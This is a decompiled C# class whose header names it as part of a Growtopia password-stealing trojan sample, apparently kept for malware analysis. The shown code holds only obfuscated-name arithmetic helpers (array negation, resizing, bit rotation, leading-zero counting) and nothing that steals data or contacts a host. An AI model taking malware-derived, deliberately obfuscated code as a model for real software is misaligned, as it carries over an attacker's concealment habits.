// Decompiled with JetBrains decompiler
// Type: 0416139A
// Assembly: SpinHack_PC, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 65E7A0C4-9AD9-4435-B85F-DA409F1EDFB9
// Assembly location: C:\Users\Administrateur\Downloads\ransomware_new\HEUR-Trojan-PSW.MSIL.Growtopia.gen-6e6f85f9f7933c4446076b2de915fc2fbc76ca58137fe993addedeabb4392347.exe

using System;

internal static class \u0030416139A
{
  private const int \u003096A7DBF = 32;

  internal static void \u00367274660(uint[] _param0)
  {
    int index = 0;
    uint num = 0;
    for (; index < _param0.Length; ++index)
    {
      num = (uint) (~(int) _param0[index] + 1);
      _param0[index] = num;
      if (num != 0U)
      {
        ++index;
        break;
      }
    }
    if (num != 0U)
    {
      for (; index < _param0.Length; ++index)
        _param0[index] = ~_param0[index];
    }
    else
    {
      _param0 = \u0030416139A.\u0033A820A66(_param0, _param0.Length + 1);
      _param0[_param0.Length - 1] = 1U;
    }
  }

  private static uint[] \u0033A820A66(uint[] _param0, int _param1)
  {
    if (_param0.Length == _param1)
      return _param0;
    uint[] numArray = new uint[_param1];
    int num = Math.Min(_param0.Length, _param1);
    for (int index = 0; index < num; ++index)
      numArray[index] = _param0[index];
    return numArray;
  }

  internal static void \u00330CE6A90<T>(ref T _param0, ref T _param1)
  {
    T obj = _param0;
    _param0 = _param1;
    _param1 = obj;
  }

  internal static ulong \u00328CC1442(uint _param0, uint _param1) => (ulong) _param0 << 32 | (ulong) _param1;

  internal static uint \u003655665E8(ulong _param0) => (uint) _param0;

  internal static uint \u0033E3546F2(ulong _param0) => (uint) (_param0 >> 32);

  private static uint \u00358C03C76(uint _param0, uint _param1) => (_param0 << 7 | _param0 >> 25) ^ _param1;

  internal static int \u0032E650813(int _param0, int _param1) => (int) \u0030416139A.\u00358C03C76((uint) _param0, (uint) _param1);

  internal static int \u003188A4AD0(uint _param0)
  {
    if (_param0 == 0U)
      return 32;
    int num = 0;
    if (((int) _param0 & -65536) == 0)
    {
      num += 16;
      _param0 <<= 16;
    }
    if (((int) _param0 & -16777216) == 0)
    {
      num += 8;
      _param0 <<= 8;
    }
    if (((int) _param0 & -268435456) == 0)
    {
      num += 4;
      _param0 <<= 4;
    }
    if (((int) _param0 & -1073741824) == 0)
    {
      num += 2;
      _param0 <<= 2;
    }
    if (((int) _param0 & int.MinValue) == 0)
      ++num;
    return num;
  }
}
